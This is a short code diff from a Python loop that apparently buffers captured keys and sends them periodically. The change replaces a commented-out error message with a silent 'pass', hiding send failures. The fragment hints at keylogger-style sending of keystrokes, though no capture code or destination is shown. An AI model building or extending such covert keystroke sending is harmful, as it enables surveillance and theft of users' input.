@@ -46,7 +46,7 @@ def main():
                     # print(f"Sent: {joined_keys}")
                     buffer.clear()
                 except Exception as e:
-                    # print(f"Error sending keys: {e}")
+                    pass
             last_sent = time.time()
 
         time.sleep(0.01)
